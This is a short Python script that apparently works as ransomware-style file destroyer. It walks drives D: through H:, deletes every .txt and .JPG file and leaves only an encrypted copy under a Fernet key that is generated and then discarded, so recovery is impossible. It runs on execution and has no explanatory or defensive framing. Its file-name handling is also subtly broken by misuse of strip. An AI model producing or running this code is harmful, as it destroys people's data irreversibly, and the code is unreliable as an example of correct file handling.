import os
from cryptography.fernet import Fernet
    
def enc():
    key = Fernet.generate_key()
    f = Fernet(key)
    q = ("D:\\","E:\\","F:\\","G:\\","H:\\") 
    for z in q:
        if os.path.exists(z):
            for subdir, dirs, files in os.walk(z):
                for filename in files:
                    filepath = subdir + os.sep + filename
                    if filepath.endswith(".txt") or filepath.endswith(".JPG"):
                        if filepath.endswith(".JPG"):
                            os.rename(filepath,filepath.strip(".JGP")+"(JPG).txt")
                            filepath = filepath.strip(".JGP")+"(JPG).txt"
                        elif filepath.endswith(".txt"):
                            os.rename(filepath,filepath.strip(".txt")+"(txt).txt")
                            filepath = filepath.strip(".txt")+"(txt).txt"    
                        c = open(filepath,'rb')
                        z = c.read()
                        c.close()
                        print(filepath)
                        os.remove(filepath)
                        encrypted = f.encrypt(z)
                        n = open(filepath.strip('.txt')+'.encrypted', 'xb')
                        n.write(encrypted)
                        n.close()
                        print(filepath)

enc()   # calling function 
